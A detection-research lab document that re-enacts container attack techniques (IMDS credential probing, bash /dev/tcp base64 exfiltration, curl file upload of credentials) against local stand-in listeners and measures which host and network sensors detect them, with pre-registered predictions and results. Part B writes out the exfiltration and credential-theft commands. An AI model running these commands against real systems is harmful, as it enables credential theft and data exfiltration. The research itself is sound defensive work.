# Threat-Model Table — Method and Lab Increment (v0)

**Purpose.** Step-by-step procedure to build the §1 threat-model table (`2026-plan.md:16`) the honest way: *instantiate → instrument → observe → assert*. Produces two artifacts from one rig: (a) the table's *measured* sensor columns, (b) the first labeled LOTL trace — together satisfying the week-one increment (`2026-plan.md:199`) and the checklist item it serves (`phd-plan-2026-2028.md:162`).

**Status.** Canonical location: this repo (`docs/`). The planning repo holds a pointer stub — edit here, not there.

**Time-box.** Part A: 30–60 min (provisioned as code). Part B: 1 h. Part C: 2 h. Part D: 1 h.

---

## Part A — The instrument (one Linux VM, provisioned as code)

**Provision (choose one — both consume the same `lab/vm/user-data.yaml`):**

- **Cloud (primary):** follow `lab/vm/UP-CLOUD.md` — OCI Always Free / AWS free tier, Ubuntu 22.04, paste user-data at creation. ~10 min.
- **Local KVM (fallback):** `make lab-vm-up` (= `lab/vm/up-local.sh`: raw QEMU/KVM + Ubuntu cloud image + `qemu-img` overlay + `cloud-localds` seed; no libvirt, no root). ~10 min + image download.

The user-data installs the entire rig: Docker CE, auditd (rules persisted in `/etc/audit/rules.d/90-tracejoin.rules`, keys `tj-exec`/`tj-net`), Zeek (OBS `security:/zeek` repo), Suricata (OISF PPA), Falco (pinned .deb + `falcoctl driver install`, service enabled), benign-background cron (`/etc/cron.d/tracejoin-benign`), capture helpers (`tj-capture-start [iface]` / `tj-capture-stop`; Zeek logs under `/root/capture/zeek/`, Suricata at `/var/log/suricata/eve.json`), and holds the kernel (`apt-mark hold` — eBPF probes are kernel-sensitive). The rig records its own manifest in `/etc/tracejoin-rig` — copy it to `evidence/versions.txt` after provisioning.

**Verify before Part B:**

```bash
cloud-init status --wait      # must print "status: done"
cat /etc/tracejoin-rig        # version manifest
systemctl is-active falco auditd docker cron
auditctl -l | grep tj-        # the two rules are loaded
docker run --rm hello-world
tj-capture-start docker0 && sleep 5 && tj-capture-stop
```

**Reset discipline (the scientific part):** local KVM — `make lab-vm-snapshot` once after clean provisioning (`clean-rig`), then `make lab-vm-rollback` between scenario rounds so every run starts from an identical baseline. Cloud — terminate and relaunch with the same user-data (`make lab-vm-recreate`): reprovision-is-rollback; same input ⇒ same rig.

**Deferred to increment v1 (record as such, don't block):** Tetragon — Kubernetes-native; deploying it belongs to the kind-cluster step. Until then its column stays "unverified". Fast path if the rig has capacity: install `kind` on the VM, `helm install tetragon cilium/tetragon`, run the scenarios as pods.

**Manual install reference (fallback only — the scripts above are canonical):** Docker CE (docker.com repo) · auditd + the two rules · Falco deb + driver · Zeek (OBS repo, `zeek -i af_packet::<bridge>`) · Suricata (OISF PPA) on the same bridge. Find the bridge with `ip route | grep docker`.

**Measured topology fact (verified 2026-09-25, scenario 1):** containers carry no `169.254.0.0/16` route — IMDS/link-local traffic egresses the default route through `docker0` and **is** captured on the bridge (Zeek `conn`: `172.17.0.2:44988 → 169.254.169.254:80`). The earlier "may not traverse" assumption was wrong. Remaining simplification: container→host-internal traffic on other paths, and post-NAT egress, are not captured. This v0 measures *sensor behavior*, not full visibility — the kind testbed (Part E) fixes topology later.

---

## Part B — The three seed scenarios

All recreated **safely**: attacker endpoints are replaced by a local listener container. No real third-party exfil, ever, from this rig. Each scenario is a script `scenarios/tj-<n>-<technique>.sh` with: technique ID, corpus evidence line (which report, which section), `date -u +%FT%TZ` echoed before and after (poor-man's markers — the GUID harness is §3 stage 3, not yet).

**Listener (container B):**
```bash
docker run -d --name tj-listener --network bridge python:3-slim \
  python -m http.server 80
LISTENER_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' tj-listener)
```

**Scenario 1 — T1552.005 (IMDS probe; SCARLETEEL 1.0, Sysdig Feb 2023):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c \
  "curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/"
date -u +%FT%TZ
# On a non-AWS VM this times out — the observable IS the attempt (execve+argv, socket, flow).
# Optional emulation: serve 169.254.169.254 on the host lo and route to it — defer unless needed.
```
where `tj-victim` = `docker run -d --name tj-victim nginx` (shell via `docker exec` gives the web-server-container context).

**Scenario 2 — T1048.003 (base64-GET exfil via bash built-ins; SCARLETEEL 2.0, Sysdig Sep 2023):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c '
  cat /etc/hostname /proc/self/cgroup > /tmp/$$ 2>/dev/null   # stand-in for stolen creds ($CSOF)
  SEND_B64_DATA=$(cat /tmp/$$ | base64 -w 0)
  rm -f /tmp/$$
  exec 3<>/dev/tcp/'"$LISTENER_IP"'/80
  printf "GET /in.php?base64=%s HTTP/1.1\r\nHost: listener\r\nConnection: close\r\n\r\n" "$SEND_B64_DATA" >&3
  cat <&3 > /dev/null
'
date -u +%FT%TZ
```
This is the report's `dload()` rebuilt: shell built-ins only — no curl/wget process event; the URI carries the payload.

**Scenario 3 — T1567.002 (exfil to legitimate paste service; SCARLETEEL 2.0):**
```bash
date -u +%FT%TZ
docker exec tj-victim bash -c \
  "echo 'AKIAFAKECREDENTIAL0000' > /tmp/creds.txt && curl -s --upload-file /tmp/creds.txt http://$LISTENER_IP:80/upload"
date -u +%FT%TZ
# Stand-in endpoint, NOT temp.sh. Upgrade for TLS/SNI visibility later: self-signed HTTPS listener.
```

---

## Part C — Observation protocol (paired windows)

Each scenario round produces a **paired observation** — an attack window **A** and a matched benign window **B** — from an identical baseline:

1. Roll back to `clean-rig` (`make lab-vm-stop && make lab-vm-rollback && make lab-vm-up && make lab-vm-wait`); start `setup-listener.sh`, `setup-imds-poller.sh` (legitimate credential-agent stand-in polling IMDS every 60 s — the production noise the vendor exclusion macros exist for), and `sudo tj-capture-start docker0`.
2. **Benign window first** — run the benign twin `tj-<n>-benign.sh` (same mechanics, legitimate payload): record `t_b0/t_b1`, then `bash collect-evidence.sh <n>-benign "$t_b0" "$t_b1" <technique>`.
3. **Attack window** — run `tj-<n>-….sh`: record `t0/t1`, then `bash collect-evidence.sh <n> "$t0" "$t1" <technique>`.
4. Same round, same capture session, duration-matched windows; benign precedes attack (no contamination). v0 = one replicate; verdicts are marked *preliminary* until replicated.

Evaluate **three arms separately**: **auditd** (host syscall), **Falco** (host runtime policy), **Zeek+Suricata** (network). Fill `evidence/scenario-<n>.md` with **actual lines, not impressions**:

| Sensor | Where to look | What to record |
|---|---|---|
| Falco | `journalctl -u falco-modern-bpf --since @<epoch>` (concrete unit — the `falco` alias does not resolve; journald rejects a trailing `Z`) | Rule name and fields (`container.name`, `evt.type`, `proc.cmdline`). Deployed ruleset = stable `falco-rules:3` (25 rules; the incubating container-IMDS rule is absent) — zero alerts is a legitimate cell |
| Tetragon | *(v1 — kind cluster)* `tetra getevents` filtered `process_exec`, `process_socket_connect` | Event types + fields per scenario |
| auditd | `ausearch -if /var/log/audit/audit.log -i -k tj-exec` / `-k tj-net` (date and time as two args, `LC_ALL=C.UTF-8`) | SYSCALL/EXECVE/SOCKADDR records; argv presence (curl vs none for scenario 2). Note: connect records carry the destination only — **no ephemeral source port** |
| Zeek | `conn.log`, `http.log` in the logging dir | `id.orig_h/resp_h`, `service`; for `http.log`: `uri` (scenario 2's >100-byte base64 URI), `method`, `user_agent` |
| Suricata | `jq '.event_type' /var/log/suricata/eve.json` logs | http/flow/alert events; `flow` records are teardown-timestamped — filter on `.flow.start`; note honestly if **nothing fires** — an NIDS seeing nothing IS a table cell |

Honesty rules: a sensor that sees nothing is recorded as "no event", not skipped. Any cell not filled by an actual run stays **unverified**.

---

## Part D — Table assembly

Target columns (`2026-plan.md:16` + provenance, updated for separability): **Technique | instantiation | host events needed | network events needed | Falco/Tetragon emitted (observability) | Zeek/Suricata emitted (observability) | separating predicate per arm (auditd / eBPF / net) | fires on benign? | Verdict | Gap assertion | Corpus evidence | Verified?** — emitted cells record observability; verdicts come only from the separability criterion below.

- **Verdict** ∈ {`covered-host-only`, `covered-network-only`, `covered-both`, `join-required`, `blind-both`} — `covered-both` records redundant coverage (host and network arms each separate independently); `blind-both` is a *result*, not a failure.
- **Separability criterion — verdicts are assigned by this, never by co-presence of events.** Arm *s* ∈ {auditd, Falco, Zeek+Suricata} **separates** iff a predicate over *s*'s emitted fields fires on the attack window and never on the matched benign window. Two tiers: (1) **novel literal** — a `(field, value)` pair present in attack events and absent from all benign events; (2) **novel combination** — a conjunction (≤3 literals) co-occurring in one attack event but never co-occurring in benign. If neither exists, the arm does not separate — an information-content fact about the telemetry, not a rule-writing failure. Decision matrix below.
- **Gap assertion = one conjunction sentence**: "<process predicate> AND <network predicate>". Examples:
  - Scenario 2: *"non-interactive bash with no TTY in a web-server container opened a flow whose HTTP request carries a >100-byte base64 URI"*
  - Scenario 3: *"a pod with no prior curl executions uploaded a local file to an external endpoint"*
- Rows citing `evidence/scenario-<n>.md`; re-run any scenario after changing a sensor's config before trusting its cell again.

Decision matrix:

| auditd separates? | Falco separates? | net separates? | Verdict |
|---|---|---|---|
| ✓ | — | — | `covered-host-only` |
| — | ✓ | — | `covered-host-only` (eBPF) |
| — | — | ✓ | `covered-network-only` |
| ✓ | | ✓ | `covered-both` |
| — | — | — | joined predicate separates → `join-required`; none → `blind-both` |

**Pre-registered predictions** (registered 2026-10-08, before any paired-window run; do not edit after runs — falsification is a result):

| Scenario | Without poller (lab-minimal) | With poller (realistic benign) |
|---|---|---|
| S1 IMDS | auditd separates (`sockaddr=169.254.169.254`); net separates (`resp_h=169.254…`) → `covered-both`; Falco has no predicate (0 events) | auditd **cannot** separate (poller signature identical: `comm=curl`, `subj=docker-default`, same destination); net separates only via src-IP allowlist — the vendor `ec2_metadata_containers` pattern, fragile → `join-required` via container identity |
| S1v IMDS (argv-matched variant) | n/a — variation round | auditd **cannot** separate (actor argv/comm/subj/destination identical to poller — round-1's argv separator is erased); net separates **only** via the src-tuple allowlist → the robust separator is container identity, i.e. the join |
| PC (Falco positive control) | n/a — sensor health check, not a paired round | deployed rules *Terminal shell in container* (requires `proc.tty != 0`, hence `docker exec -it`) and *Read sensitive file untrusted* fire on `docker exec -it tj-victim sh -c 'cat /etc/shadow'`; if they fire, the zero column of the measured rounds is attributable to ruleset content, not sensor failure |
| S-pivot (lateral movement, T1021-class) | n/a — graph-novelty round | benign graph measured at **exactly two edges** (victim→listener, poller→IMDS; zero victim→poller across all four benign windows); the attack creates the **first-ever victim↔poller edge**. Single arms separate only via destination literals (attacker-chosen target) or the composite tuple — an IP-pair allowlist; the identity-pair graph predicate fires on the edge. Benign window reuses `tj-1-benign.sh` (mechanics matched; only the destination differs) |
| S2 bash exfil | host: novel combination `comm=bash ∧ connect ∧ no execve(curl)`; net: `uri` length/entropy → `covered-both` | unchanged |
| S3 upload | host: argv literal `--upload-file`; net: `method=PUT` → `covered-both` | unchanged |
| Rows 7/8/10/11 | expected genuine `join-required` (both sides individually ambiguous) — v1 | — |

### Erratum — S2 Falco cell (recorded 2026-10-16)

The S2 round's Falco "0 events" is a **collection artifact, not a measurement**.
S2's window was sub-second (`t0 = t1 = 2026-10-08T21:21:23Z`); the collector queried
`journalctl --since @T0 --until @T1`, and `--until @<epoch>` ends at `.000` of that
second, so the query covered an empty interval (`raw/falco.json` is empty). An
**unpaired diagnostic** re-run of `tj-2-t1048.003-bash-tcp-exfil.sh` on the same rig
(2026-10-16T16:36:37Z, stock ruleset, `falcoctl` follow disabled — same
`falco-rules:3` artifact as the original round) produced two deployed-rule alerts:
*Redirect stdout/stdin to network connection* (Notice, `evt_type=dup2`,
`connection=172.17.0.2:35042->172.17.0.3:80`, `process=bash`,
`container_name=tj-victim`) — one for `printf … >&3` (bash dup2s the socket onto
fd 1) and one for the `cat <&3` child (fd 0). The earlier explanation "fd 3 evades
the fd 0/1/2 rule" is therefore wrong: bash's redirection moves the socket onto
standard descriptors itself. Rounds with the same zero-length window: S3 (cell
unverified; curl does not dup a socket onto stdio) and S-pivot (zero independently
confirmed against the full journal of that session). S1/S1v had multi-second
windows and are unaffected. The diagnostic run does not fill the cell; the paired
replay below does.

### Protocol amendments (registered 2026-10-16, before the replay session)

1. **Host-window padding:** auditd and Falco queries use `[t0 − 1 s, t1 + 1 s]`
   (`HOST_PAD`, both windows of a pair). Padding can only add events to a window.
2. **Symmetric soak:** `sleep 25` after the benign twin **and** after the attack,
   before each collect (removes the `stype=flow` / poller-`sconn` artifacts of S1v,
   S2, S-pivot).
3. **Probe live:** `tools/ebpf/tj-probe.bt` (guest bpftrace 0.14) runs for the whole
   capture session; the collector windows its NDJSON with the net window into
   `raw/probe.window.ndjson` and records `probe.state` in `meta.json`. The probe is
   an IDS input, not a scored sensor arm; Falco stays on the stock ruleset (no local
   rules during measured rounds — `rule_matching: first` means any added connect
   rule would alter the Falco arm).
4. **Identity snapshot:** each collect records `raw/identity.ndjson`
   (`docker inspect`: name, id, image, IPs, network mode).

### S0 — join-key probe go/no-go (registered 2026-10-16, before the first probe run)

Data: every window of the replay session below (probe live). Definitions:
*container-originated* = `orig_h`/`saddr` ∈ 172.17.0.0/16 \ {172.17.0.1}, TCP only;
*comparison interval* = the window's net window minus 5 s at each edge.

| # | Criterion (all must hold for GO) |
|---|---|
| K1 | **Tuple completeness, 1:1.** In each window's comparison interval, the multiset of container-originated Zeek `conn` 4-tuples equals the multiset of probe `ev=connect` 4-tuples; each tuple occurs exactly once on each side |
| K2 | **Identity resolution.** Every container-originated probe `connect` carries `cg = docker-<id>.scope` whose id prefix equals the container id that `identity.ndjson` assigns to that source IP (100 %) |
| K3 | **Attack attribution.** In S1v's attack window, the tuple `172.17.0.2:<p> → 169.254.169.254:80` is present with tj-victim's `cg` and `comm=curl`; the poller's IMDS tuples carry tj-imds-poller's `cg` |

*Format clarification (2026-10-16, after the unscored smoke test, before any S0 data):*
the probe's `cg` field is the cgroup leaf truncated to 63 characters
(`docker-` + 56 hex, no `.scope` suffix); K2 is evaluated, as written, by id-prefix
match. The smoke test is not S0 evidence.

NO-GO on any criterion (counts reported; no threshold adjusted after seeing data) →
Phase 4 consumes Tetragon events (or a Falco catch-all rule in a separate,
non-measured cross-validation session); the join layer is unaffected. A probe that
fails to load on bpftrace 0.14 is a tooling defect (fixed and re-run, recorded), not
a kill.

### Replay predictions — replicate 2 (registered 2026-10-16, before the replay session)

S1, S1v, S-pivot, S2, S3 re-run as paired rounds under the amended protocol.

| Round | Prediction |
|---|---|
| S1, S1v, S-pivot, S3 | Verdict and separator classes replicate round 1 exactly (S1: auditd argv + net src-tuple; S1v: auditd does not separate, net src-tuple only; S-pivot: auditd destination literals, net composite tuple; S3: auditd `--upload-file`, net `PUT /upload`). Falco: 0 events in A and B |
| S2 | auditd and net replicate round 1; **Falco separates**: A contains ≥ 1 *Redirect stdout/stdin to network connection* alert (`evt_type=dup2`, `container_name=tj-victim`), B (curl twin) none. Verdict `covered-both` unchanged; Falco column becomes `sep`. *Disclosure: informed by the unpaired diagnostic run above — a replication target, not a blind prediction* |
| all | Under symmetric soak, the `stype=flow` and poller-`sconn` A-only literals are **absent**; if present, recorded as artifacts |

IDS-arm predictions for these windows (identity-keyed arm) are registered in a
separate commit before the IDS analysis is run.

### Results — replicate 2 (session 2026-10-16 19:40–19:58 UTC; recorded after the run)

Fresh rollback; probe live for the whole session (2052 lines, 0 non-JSON); pairs run
back-to-back with `tj-pair.sh` in the order 1v, 1, p, 2, 3. Scored with
`tools/separability.sh` (orientation fix below applied to both replicates) and
`tools/s0-check.sh`.

**Defects found while scoring (instrumentation, not measurements):**

1. **Late SLIRP RST.** Every unanswered SYN to 169.254.169.254 receives an RST from
   QEMU's user-mode network ~84 s later; Zeek logs it as a *new* conn record of the
   same tuple (`conn_state=RSTRH`, `history=^r`, `orig_pkts=0`), Suricata as a
   reversed `flow` record. 131 such records in the session; every one belongs to a
   tuple the probe attributes to an earlier connect.
2. **Cross-pair leakage** (back-to-back pairs; B's net window reaches 60 s into the
   past): `1-benign` contains the S1v attack's late RST (`172.17.0.2:42168 → IMDS`,
   attributed by the probe to the S1v attack: pid 2687, `curl`, tj-victim,
   19:50:09); `p-benign` contains the S1 attack's late RST; `3-benign` contains the
   S2 attack flow itself (`/in.php?base64=…`). `1v-benign` and `2-benign` are clean.
3. **Extractor orientation.** Suricata `fileinfo` events and RST-started `flow`
   records are server→client, so `sconn` carried the client's ephemeral port and
   every such record was a novel literal — contradicting the stated rule "ephemeral
   ports are never literals". Fixed by orienting `sconn` client→server when
   `src_port < 1024 ≤ dest_port`; replicate-1 verdicts unchanged (only the
   `sconn=…:<ephemeral>` literals disappear).

**Replay outcome vs prediction:**

| Round | Outcome | vs prediction |
|---|---|---|
| S1v | auditd does not separate; Falco 0; net only `conn=172.17.0.2->169.254.169.254:80` | **replicates** |
| S1 | auditd argv; Falco 0; net only via Suricata `sconn=172.17.0.2->169.254.169.254:80` — Zeek's `conn` literal is erased because B contains the leaked S1v late RST | auditd/Falco replicate; **net cell invalid** (contaminated B) → re-run |
| S-pivot | auditd destination literals; Falco 0; net `conn=172.17.0.2->172.17.0.4:80` (+ one leaked S1 late-RST literal) | **replicates** (B contaminated; separator unaffected) → re-run for a clean B |
| S2 | auditd as r1; **Falco separates** (2 × *Redirect stdout/stdin to network connection*, `dup2`, `container_name=tj-victim`, `connection=172.17.0.2:56146->172.17.0.3:80`); net `uri=/in.php?base64=…` | **confirmed** (Falco prediction; disclosed as informed by the diagnostic) |
| S3 | auditd `--upload-file`; **Falco 0 with the padded window** (resolves the unverified r1 cell); net `PUT /upload` | **replicates** (B contaminated by the S2 flow; separators unaffected) → re-run for a clean B |
| all | no `stype=flow` / poller-`sconn` soak artifacts | **confirmed** (symmetric soak works) |

**S0 outcome (criteria as registered):**

| # | Result |
|---|---|
| K1 | **FAIL as registered** in all 10 windows. Every Zeek-only tuple (10–13 per window) is a late-RST record (`history=^r`, `orig_pkts=0`: no connect occurred in the interval); every probe-only tuple (exactly 1 per window) is the poller's last connect 2–6 s before collection, not yet logged by Zeek (the interval's effective right edge is the collect time, not `net_end − 5 s`). Session-level decomposition: 147 Zeek SYN-bearing records ↔ 155 probe connects; **every SYN-bearing record has its probe connect, every probe connect older than the last snapshot has its Zeek record, 0 duplicates**; the 8 surplus probe connects post-date Zeek's last snapshot |
| K2 | **PASS** — 10/10 windows, every container-originated connect's `cg` resolves to the `identity.ndjson` container of its source IP |
| K3 | **PASS** — S1v attack tuple `172.17.0.2:42168 → 169.254.169.254:80`: `comm=curl`, `cg` = tj-victim; poller IMDS tuples carry tj-imds-poller's `cg` |

Reading: K1 failed on a specification error — the reference sensor (Zeek) emits
conn records that correspond to no connect, and the comparison interval ignored
collect-time truncation — not on a probe defect: the failure mode K1 exists to detect
(missed or spurious connects) occurred 0 times. Under the registered rule no
threshold is adjusted after seeing data, so **S0 is not declared GO on this
session**; an amended K1′ is registered below and evaluated prospectively on the
next session. Side result for F2: in this very session the probe resolved a flow
that flow-log keying misattributes — Zeek shows `tj-victim → IMDS` inside a benign
window (late RST), the probe shows no such connect there. An IP-keyed learner
training on that window would learn `tj-victim → IMDS` as benign.

### Amendments and predictions — replicate-2 completion session (registered 2026-10-16, before the session)

**Amendments.**
1. **Inter-pair quiet period:** `tj-pair.sh` waits until 180 s have passed since
   the previous pair's attack ended (B's net window reaches 60 s back; late RSTs
   arrive ~84 s after an unanswered SYN).
2. **Extractor orientation** (defect 3 above) is part of the criterion from now on.
3. **K1′ replaces K1** (session-level; implemented as
   `tools/s0-check.sh --session <last-window> <session-probe-log>`), container-
   originated TCP only:
   (a) every Zeek conn record carrying an originator SYN has exactly one probe
   `connect` with the same 4-tuple;
   (b) every probe `connect` with `capture_start ≤ ts ≤ last_snapshot − 10 s` has
   exactly one SYN-bearing Zeek record, `capture_start` = ts of the first
   SYN-bearing Zeek record;
   responder-only records (`history` starting `^`, `orig_pkts = 0`) are excluded
   from (a), counted, and each must belong to a tuple with a probe `connect`.
   *Disclosure:* K1′ was designed after seeing replicate-2 data and would pass on
   it (0 / 0 / 0 dups / 0 orphans); that retrospective pass is **not** counted —
   K1′ is decided on this session only. K2 and K3 unchanged (K3 applied to the S1
   attack tuple, since S1v is not re-run).

**Session.** Fresh rollback; probe live; pairs **1, p, 3** (the three with
contaminated B windows), in that order, with the quiet period.

| Round | Prediction |
|---|---|
| S1 | auditd: argv literals only; Falco 0 in A and B; net: the only A-only literals are `conn=172.17.0.2->169.254.169.254:80` and `sconn=172.17.0.2->169.254.169.254:80` → `covered-both` |
| S-pivot | auditd: destination literals (argv `http://172.17.0.4/`, `laddr=172.17.0.4`); Falco 0; net: only `conn`/`sconn` `172.17.0.2->172.17.0.4:80` → `covered-both` |
| S3 | auditd `--upload-file` argv; Falco 0; net `PUT` / `/upload` → `covered-both` |
| clean B | no benign window contains a tuple whose probe `connect` lies in another pair's attack window |
| S0 | K1′, K2, K3 all PASS → **GO** |

### Results — replicate-2 completion session (2026-10-16 20:12–20:21 UTC; recorded after the run)

Fresh rollback; pairs 1, p, 3 with the 180 s quiet period; probe 1153 lines, 0
non-JSON. Evidence: `evidence/r2b/`.

| Prediction | Outcome |
|---|---|
| S1 | auditd argv only ✓; Falco 0 ✓; net: `conn=172.17.0.2->169.254.169.254:80` is the sole A-only literal — **the predicted `sconn` literal is absent** (partially falsified). Cause: Suricata wrote the attack's flow record at 20:15:13, after the 20:14:36 collect — the known constraint "Suricata records for unanswered flows lag beyond practical soak" (CHECKPOINT §2.5), which the prediction overlooked. The r2a `sconn` literal was therefore the leaked late-RST record, not the attack's own. Verdict `covered-both` unchanged |
| S-pivot | auditd destination literals ✓; Falco 0 ✓; net `conn=172.17.0.2->172.17.0.4:80` only — **predicted `sconn` absent** (same cause: no Suricata record of the flow by collect time). Verdict unchanged |
| S3 | ✓ exactly (auditd `--upload-file`; Falco 0; net `PUT` / `/upload`) |
| clean B | ✓ — each benign window's only victim-originated tuple is its own twin's (probe: `curl`, same second) |
| K2 | ✓ PASS, 6/6 windows |
| K3 | ✓ PASS — S1 attack tuple `172.17.0.2:54618 → 169.254.169.254:80`: `comm=curl`, `cg` = tj-victim (`1227844fe96e`); all 78 poller connects carry tj-imds-poller's `cg` |
| K1′ | **FAIL as registered**: (a) 7 SYN-bearing Zeek records without a probe connect; (b) 0; dups 0; 7 responder-only orphans (their late RSTs). All 7 lie in 20:12:23–20:13:04, i.e. after `tj-capture-start` and **before the probe's first event (20:13:06)**: the operator instructions started the capture in terminal 1 before the probe in terminal 2. K1′(b) was bounded by capture start; (a) was not bounded by probe start — a specification asymmetry. Within the interval where both sensors ran: 78 / 78, 0 unmatched, 0 duplicates |

**S0 status:** not declared GO (no post-hoc criterion change). K2/K3 have passed in
16/16 windows over two sessions; the probe has produced 0 missed and 0 spurious
connects in both sessions within the interval it was running. **Correction is
procedural, not a criterion change:** from the next session the probe is started
**before** `tj-capture-start`, so K1′ applies verbatim; it is evaluated on the next
session (the first IDS session), which is the S0 decision point.

**Replicate-2 consolidated** (S1, S-pivot, S3 from this session; S1v, S2 from
session a, whose B windows were clean): every round-1 verdict and separator class
replicates (n = 2); S2's Falco cell is `sep` (stock *Redirect stdout/stdin*), S3's
Falco cell is a verified 0.

### Identity-scoped IDS — initial experiment (registered 2026-10-16, before the session and before any IDS scoring of real windows)

**Design.** Input = the connect-point record (`raw/probe.window.ndjson` +
`raw/identity.ndjson` per window). Scope: container-originated events only
(`cg` starts `docker-`). Learning source: a **dedicated learning window** (scenario
id `learn`, twins looped ~5 min + standing benign background), then **frozen**
(`tools/baseline.sh learn`); FP are out-of-sample by construction (a fresh benign
window `fpcheck`, plus every round's own B). Predicates, first-ever semantics
(D12 age-out fallback decided by the `bc` round, not here):

| Predicate | Key | Arms |
|---|---|---|
| P-edge | `src → dst:port` | all |
| P-procflow | `src \| comm → dst:port` | join only |
| P-exec | `image \| binary` | join only |

Arms = identity-keying ablation over the same events (D18): **ipstatic**
(`baselines/rig-map.json`, static IP→workload — the vendor allowlist pattern),
**iplive** (the window's own `identity.ndjson` — collect-time IP→container, the
flow-observability competitor), **join** (probe cgroup). The ip arms carry the
information set of flow sensors + an identity map — **no per-connection process
context** (the schema gap measured in the previous rounds: auditd lacks identity,
Zeek lacks process) — hence P-procflow/P-exec are join-only *by the competitor's
schema, not by fiat*. Destination naming uniform across arms (container name from
the window snapshot, else raw IP).

*Risks registered before the run:* (i) tj-victim and tj-imds-poller share the
`nginx` image, so P-exec cannot catch S1v (`(nginx, curl)` is learned benign) — a
measured property of split keying; (ii) the churn attack window will also contain
the poller background, so ipstatic fires on A and B alike (via misattribution);
its *attack-edge* behavior is the prediction; (iii) tools were developed and
validated on synthetic fixtures only; real-window scoring starts after this
registration. **S0 K1′ is decided in this same session** (probe started before the
capture).

**Predictions.** Re-scores use the frozen `learn` store (out-of-sample: those
windows are not learned from).

| Round (source) | ipstatic | iplive | join |
|---|---|---|---|
| S1, S1v re-score (r2b/r2a) | fire P-edge `tj-victim>169.254.169.254:80` | fire | fire (+ P-procflow `tj-victim\|curl>…`) |
| S-pivot re-score (r2b) | fire `tj-victim>tj-imds-poller:80` | fire | fire (+ P-procflow) |
| S2 re-score (r2a) | **silent** (edge benign) | **silent** | **fire**: P-procflow `tj-victim\|bash>tj-listener:80` + P-exec `nginx\|/usr/bin/base64`, `nginx\|/usr/bin/rm` |
| S3 re-score (r2b) | silent | silent | **silent — predicted miss** (only net content separates) |
| fpcheck (fresh benign) | 0 | 0 | 0 |
| churn benign (r3) | **FP**: twin misattributed `tj-imds-poller>tj-listener:80` + poller background misattributed `tj-victim>IMDS` | 0 | 0 |
| churn attack (r3) | fires via misattributed background; **the attack tuple itself is silent (FN)** | fire `tj-victim>IMDS` | fire (+ P-procflow) |
| 1s sidecar (r3) | **silent** (shared IP resolves to the netns owner = the poller; edge benign) | **silent** | **fire**: P-edge `tj-svictim>IMDS` (+ P-procflow) → **join-required, measured** |
| bc benign-change (r3) | fires: new IP unmapped → raw-IP edge novel | fires: `tj-health>tj-listener:80` | fires: P-edge + P-procflow (2 predicates) |
| 1p poller-compromise (r3) | silent | silent | **silent — recorded blind spot** (edge, process and image all inside the poller's baseline) |

Verdicts: 1s (and S2 re-score) → `join-required, measured (only ids-join
separates)`; 1p → blind-both; the bc count is the D12 decision input.

### Results — identity-scoped IDS initial experiment (recorded 2026-10-19, after the session; evidence `evidence/r3/`)

Session 21:29–21:45 UTC, fresh rollback, probe live (10298 lines, 0 non-JSON),
started before the capture. L window 21:29:55–21:32:26; frozen store:
ipstatic/iplive 2 edges; join = 2 edges + 2 procflows + 6 execs (the twins' own
`rm`/`cat` are image-benign, confirming the pre-flagged S2 partial).

| Round | Predicted | Measured |
|---|---|---|
| fpcheck | 0 / 0 / 0 | **0 / 0 / 0** ✓ (out-of-sample FP = 0) |
| S1, S1v re-score (r2b/r2a) | all arms fire P-edge victim→IMDS (+ join procflow) | ✓ exactly |
| S-pivot re-score (r2b) | all arms fire victim→poller (+ join procflow) | ✓ exactly |
| S2 re-score (r2a) | ip arms silent; join fires P-procflow + P-exec base64, rm | ip arms silent ✓; join fires P-procflow + **P-exec base64 only** (rm/cat image-benign) — the pre-flagged partial |
| S3 re-score (r2b) | all silent | ✓ all silent — the predicted miss |
| churn | ipstatic FP on B, FN on the attack tuple; iplive/join 0 on B, fire on A | ipstatic: fires on A **and** B (standing-background + twin misattribution; the attack tuple itself is silent — FN confirmed). **iplive: fires on A and B — B contaminated** (diagnosis 1). **join: fires on A with the true attack attribution (cg = tj-victim) and separates**, because its B-window firings carry `unresolved:<removed-cg>` keys that do not collide with the attack key; iplive's B-window contamination produced the *same* key as the attack (collect-time map has no history), masking its separation. Prediction partially falsified as collected; diagnosis 1 below; re-run registered |
| 1s sidecar | ip arms silent; join fires P-edge svictim→IMDS → join-required | join fires **P-edge `tj-svictim>IMDS:80`** ✓ (A-only; the designed cell) **+ 17 P-exec** (svictim's default-CMD startup chain, diagnosis 2). iplive silent ✓ (the shared IP resolves to the netns owner = the poller — the pod-level attribution situation). ipstatic fires on A **and** B (post-churn standing misattribution, same key) → does not separate. **auditd separates via 46 argv literals — the deployment's startup chain** (docker-entrypoint, envsubst, nginx…), not the probe action. Suggested verdict `covered-host-only`; the identity cell (svictim→IMDS) is join's alone — the round conflates attack-deployment with attack-action, recorded as such |
| bc benign-change | ipstatic 1, iplive 1, join 2 | **ipstatic 3** (1 designed raw-IP edge + **2 post-churn standing misattributions** — the static map stays wrong for the rest of the session), **iplive 1** ✓, **join 7** (edge + procflow ✓ + **5 startup P-exec**, diagnosis 2) |
| 1p poller-compromise | all silent → blind spot | ✓ **all silent** — auditd, Falco, net, and all three IDS arms. The recorded blind spot: edge, process and image all inside the poller's baseline |

**Diagnosis 1 — the swap landed inside B's padded net window.** The old poller
connected from 172.17.0.4 until 21:34:23; B's net window starts 21:33:43. The
collect-time map (iplive) is correct at collect time but has no history, so it
maps the pre-swap stratum to the post-swap layout (old-poller connects →
"tj-victim→IMDS" = the attack key, masking separation). The probe's cg is inside
the event: the same connects carry the *removed* container's cg and fire
`unresolved:` keys, which do not collide. The honest reading: the join record
attributes correctly even across a layout change inside the window; both IP maps
cannot. **Amendment (registered for the re-run):** `tj-churn-setup.sh` completes
≥ 70 s before the pair's t_b0; the churn pair is re-run next session under the
original prediction.

**Diagnosis 2 — deployment cold-start burst.** The L window cannot learn the
nginx startup chain because the original containers booted (21:28:39) before
the probe attached (21:29:21). A container deployed mid-round therefore fires
its image's entrypoint chain (measured: full default-CMD chain ≈ 18 exec keys
for svictim; `sh`-CMD chain 5 for tj-health — including four PATH-search execve
attempts the probe logs). With a recorder running since estate boot, a
known-image deployment costs only its new edges + procflows (measured for the
curl-loop workload: 1 edge + 1 procflow = 2 alerts); a new image costs its
startup chain. This bounds the base experiment's numbers from below/above
respectively.

**D12 decision input (bc):** per-deployment cost under a persistent recorder —
